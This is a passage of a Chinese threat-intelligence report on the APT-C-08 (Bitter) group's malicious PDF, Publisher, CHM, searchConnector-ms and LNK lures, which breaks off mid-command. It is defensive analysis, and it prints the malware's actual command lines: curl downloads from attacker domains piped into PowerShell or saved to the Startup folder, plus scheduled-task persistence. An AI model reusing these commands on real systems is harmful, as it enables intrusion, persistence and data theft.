---
title: APT-C-08（蔓灵花）组织：多元攻击载体大揭秘
url: https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&mid=2247503491&idx=1&sn=d1addc717896da93b07692d3c10eae0b&chksm=f9c1fd8aceb6749c71fd080052747a618e37778fad0169da8f46dae50c614118c04051ca5487&scene=58&subscene=0#rd
source: 360威胁情报中心
date: 2024-11-06
fetch_date: 2025-10-06T19:20:15.760985
---

# APT-C-08（蔓灵花）组织：多元攻击载体大揭秘

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/6CNEHNicic4PqLEbribBMxxkE4ahVyVVKicy6qwRmFC8dm7Bog6LWW9AbALKhO2LaV5tibKhODHxJibiaVN7ytugIx0kg/0?wx_fmt=jpeg)

# APT-C-08（蔓灵花）组织：多元攻击载体大揭秘

高级威胁研究院

360威胁情报中心

**APT-C-08**

**蔓灵花**

APT-C-08（蔓灵花）组织，又称Bitter，是一个拥有南亚地区政府背景的APT组织，近几年来持续发起针对南亚及周边国家的APT攻击，主要攻击政府、驻外机构、高校和军工行业等相关单位，以窃取敏感信息为主，具有强烈的政治背景。该组织攻击载体变化多样，攻击者善于使用各类恶意文档作为攻击入口，引诱用户打开从而下载恶意载荷让其中招，以此来窃取敏感信息。

近一年我们在日常威胁狩猎中捕获了蔓灵花组织大量攻击载体样本，其中包括但不限于PUB文件、PDF文件、宏文档、searchConnector-ms文件、CHM文件、LNK文件，部分载体文件还未被公开披露。鉴于此，本文将详细披露蔓灵花组织近一年使用过的载体文件以及相应的变化过程，以便用户及时发现，避免中招。

一、攻击活动分析

1.攻击流程分析

通过对蔓灵花组织的持续追踪，我们捕获了多个蔓灵花组织的攻击样本，其投递主要是通过鱼叉邮件捆绑各式各样的载体文件，诱导用户点击载体文件，通过层层下载，最终执行远控程序。从捕获的远控程序来看主要集中在wmRAT类型，很少部分是C#和ORPCBackdoor类型，但是这几种远控程序变化都不是很大，只是指令功能有所增加，本文不再详细分析。另外特别说明的是，攻击者使用的远控程序一般捆绑在各种MSI软件安装程序中，这样运行时会显示各类软件安装界面，以迷惑用户。下图是蔓灵花组织整体攻击流程。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8NgowoPFKEYbOic9aic17tKyliaetkEL5Tbyg8Dx6weNu98N0xYwFBtGIg/640?wx_fmt=png&from=appmsg)

从图上可以看出，攻击者使用的载体变化多样，下面就近年来使用过的载体进行详细分析，披露恶意代码植入的整个过程，希望用户警惕此类攻击。

2.PDF文档

在今年早期时候，攻击者使用PDF文档来进行钓鱼，在整个蔓灵花组织攻击过程中使用该载体并不常见。攻击者在投递过程中会给PDF文档取一个诱导性的文件名，降低用户的警惕性。下图是该PDF打开的具体内容。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP83s6hpmpxTg0DMDNG6SxF3CuN9eLyljBuzibGgI9NibJ9KswpwS47JyrA/640?wx_fmt=png&from=appmsg)

打开该文档，会提示用户该文档还存在其他附件，让用户点击“DOWNLOAD PDF”按钮，从图可以看到点击该按钮后会连接远端地址http[:]//adamsresearchshare.com/mack.php进一步下载后续文件，下载的文件实际上为Meeting Notice.rar,解压后实际上是伪装成PDF文档的LNK文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8MOCpiagAUaC1JJt3OvQEuktoeABftSPIlokm1xsWRic6sY1sZVZicr2Kg/640?wx_fmt=png&from=appmsg)

该LNK文件运行后，主要是继续连接远端地址下载VBS脚本，并将该脚本加入自启动目录。

|  |
| --- |
| C:\Windows\System32\conhost.exe --headless cmd /c msg \* "Corrupted" & curl --insecure http://adamsresearchshare.com/textcmd/cmd1.php -o "%AppData%\Microsoft\Windows\Start Menu\Programs\winegt.vbs" & "%AppData%\Microsoft\Windows\Start Menu\Programs\winegt.vbs" |

下载的VBS脚本内容如下，主要功能通过cURL命令下载最终的载荷并执行。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8uP26ArPZIUctu08IRoib8Xc3icicCpbvFqnfRqoBib9eA2fN45CypwgtSQ/640?wx_fmt=png&from=appmsg)

3.PUB文档

今年我们捕获到蔓灵花组织使用双扩展名（.pdf.pub）的PUB（Microsoft Office Publisher）文档作为载体的攻击样本，该样本携带恶意宏代码，并且宏代码被加密，如下所示。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8f2oowktNibDGRm5Z0nZb8w7BgLgmFhNzKjRToex7xqkDoEcKgGlHBmA/640?wx_fmt=png&from=appmsg)

点击启用宏后，会显示模糊的图片以此来迷惑受害者。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP80ZkZzPvGvauM6aQzKeagXD3lAiaJLQMDWvOBR2o5eMe91ZyOTcyyPAQ/640?wx_fmt=png&from=appmsg)

宏代码的功能为创建计划任务，定时下载文件并保存为C:\ProgramData\mki.rr，接着执行该文件，从宏代码来看下载的mki.rr也为脚本文件。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8zaNQImNcTnlc5X73pm0lOPOuUmibfygOl2SeNKgvosI8ERa73pvqDmA/640?wx_fmt=png&from=appmsg)

下载链接如下所示：https[:]//littlehipsononline.com/pbus.php?oo=%computername%OO%username%

我们还发现与该PUB文档具有相同域名littlehipsononline.com的CHM类型攻击文档，该文档的执行参数与PUB类型的也相似，推测两者后续流程一致，在对该CHM载荷进行分析时我们成功获取到了后一阶段载荷，CHM文档的执行参数如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP89Nn1OCiciakspmdfDibJKRPWgEqsI2ibS43JibZ436t7o8bbyVCDicBDRgyQ/640?wx_fmt=png&from=appmsg)

下载的fre.tr的功能是收集系统信息及一些用户和文件信息，如杀毒软件、当前的用户目录和用户名、系统详细信息、当前用户的下载、文档和桌面文件夹的内容和“C:\Users”目录中的用户信息发送到服务端。fre.tr的内容如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8CLnnJ0CVeJZFeKzBHIZVj03ibVXqwWicsJpXv9HfZic097cKfk4qvaozw/640?wx_fmt=png&from=appmsg)

一个合理的猜测：对于此类型攻击，攻击者都是先下发一个收集用户信息的脚本，根据上传的受害者信息判断是否符合攻击目标，当目标符合时，攻击者在服务端将fre.tr替换成下载后门的脚本，那么受害者主机上的计划任务下次请求执行时就会下载后门并执行。

4.CHM文档

在我们捕获的蔓灵花组织使用的攻击载体类型中，CHM格式的样本数量占据大多数，可见该组织尤其钟爱这一类型的利用方式。不过该组织使用CHM载体的方式也较为简单，利用内嵌的HTM文档远程下载执行，具体到样本来看区别在于其混淆方式不同，具体如下所示：

**类型一：近期使用最多的HTML实体编码类型**

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP86zMh9lJQLk5aULKPldicHXPic8GyAfBfhYhzQewbjrqhLNwR6DWX1Psg/640?wx_fmt=png&from=appmsg)

**类型二：以往使用较多的字符混淆类型**

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8S0JSJmzNicicJ3RZPPcwWblIcW02eYNd1BJOWaYFJaZkdicEPFH0IN8Mg/640?wx_fmt=png&from=appmsg)

**类型三：直接的明文类型**

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8ABpUxqiaGxjD4RQicmYeiabUoySURUQWTy6ibZxBaibnewYBHibicM7sYZ2hg/640?wx_fmt=png&from=appmsg)

**类型四：base64编码类型**

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8TYALZn2NComXXgJnibTKiaMGd3zweMUwvr7nFeKoLbkPtOatcwp5aurw/640?wx_fmt=png&from=appmsg)

此外，在利用方式也有所不同，可以分为直接下载后门载荷和间接下载后门载荷，直接下载方式如明文类型给出的例图，执行参数中带有msiexec命令，即下载为一个MSI文件；间接下载的方式通常是先创建计划任务下载一个脚本保存为图片并执行，其功能为继续下载后续后门载荷，如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYLlKib1przdDwicgiclnjEXsQr2eSBKRtJOyyZp5LK6XAkupQIiadTj9Ffg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYAHyicPqefUonE1ibSYpIibBM7gsbiaLPR3FZFicGqy1ObervMAecyXibQfyg/640?wx_fmt=png)

5.SearchConnector-ms文件

今年以来，蔓灵花组织开始采用新的攻击手段，使用searchConnector-ms文件作为初始访问阶段的载荷。当用户打开该文件后，通过WebDAV服务远程下载后续攻击载荷，通常是包含恶意LNK文件或者包含CHM文件的压缩包,当用户打开恶意文件时就会触发后续的下载执行。经过分析，这类攻击活动至少于2024年2月就已经开始，并采用钓鱼邮件投递，截止到目前，该类型样本的查杀率都极低，以其中一个样本为例如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8pmOMn0GSxTyTJ7kjG6xoxv1WJgHJGX4tTp3PHaiaMfpocERPIPibXJfw/640?wx_fmt=png&from=appmsg)

SearchConnector-ms样本的内容如下所示，

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8GFLqzXZfAn66309T1xts3VcOUr2DroDa2aiaMA6DqxiaeM5sTMpXxnFw/640?wx_fmt=png&from=appmsg)

当受害者打开文档时，将通过webdav访问远程资源http[:]//healthtipsart.com/dll/Downloads/并显示，如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYkwzNDrg0WPNIIL0SKib1DU6k6ZicDAyZkP2VcbQlKAWzo82qsqjKtLYA/640?wx_fmt=png)

受害者点击LNK时，便会执行其中携带的恶意参数，功能为创建计划任务下载执行，如下所示。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PriabaHic7u024OkupNYtzFNYWYJtJ8Sk6bGveAx2ow0877kYtvGCIINKSryzWolvtBibjbglYoTvYOA/640?wx_fmt=png)

在对该网站的分析中，我们还发现了大量的其他恶意文件，结合分析这些恶意文件都是通过searchConnector-ms方式获取，部分文件如下所示。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8xdLmzSQ77UG50ZpaSVtvCKP0L7K3VToibKMDhGzLXHO5X690eHOGcjg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8oRMByKYzvQiazEzuKuJS3j430lcP81DCWNeFX2364xW1azoE82iarIJA/640?wx_fmt=png&from=appmsg)

值得一提的是，我们在另一个使用WebDav的网站上发现了当受害者主机的ComputerNanme和UserName符合目标时，便会直接下载后续木马进行执行。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8bIqApNDE7JEBCpEIjtLH2szDFMYutx4Vnt8gAGvzScsfZEeZQ9hrPg/640?wx_fmt=png&from=appmsg)

6.LNK文件

蔓灵花组织前期使用过LNK文件作为入口攻击载荷，并通常将LNK文件连同伪装内容打包，通过压缩包的形式通过钓鱼邮件展开攻击。近期捕获的LNK主要都是配合searchConnector-ms文档进行攻击，文件总体攻击流程变化不大，只在细节处有稍许变化。

**类型一：**

这种类型的LNK文件利用256个空格填充命令行参数属性，这样就无法通过文件属性查看LNK文件的参数内容。

![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4Pp2ZVz57a8IjmDK25jAbvP8yJyhP5K4BHHKfGwmyAlTdiac390jm8AAB5yQfvJ7iabvJvMiaibbJKoapA/640?wx_fmt=png&from=appmsg)

当LNK文件执行后，首先会给出一个消息框，然后创建名为“WindowsJunkCleanerUpdateEngine”计划任务，该计划任务主要功能是使用cURL从远程地址下载后续的内容并通过Powershell执行。另外，还有部分LNK在后续载荷的执行方式选择了CMD，而不是Powershell。

|  |
| --- |
| "                                                                                                                                                                                                                                                                --headless ssh -o ProxyCommand=\"cmd /c timeout 5 & msg \* Error 0xrt4ar: Incomplete File. & schtasks /create /tn WindowsJunkCleanerUpdateEngine /f /sc minute /mo 19 /tr \\\"conhost --headless cmd /c curl --ssl-no-revoke -o - https://www.gdatesystems.com/mdhy/btja.php?kl=%computername%II%username% | powershell\\\" \" ." |

**类型二：**

这种类型的LNK文件除了使用空格填充命令行参数属性意外，攻击流程也发生了些许改变，该LNK文件首先下载了和计划任务相关的XML配置文件，然后再创建计划任务。

|  |
| --- |
| "                                                                                                                                                                                                                                                                --headless cmd /c curl -o %public%\\Documents\\config....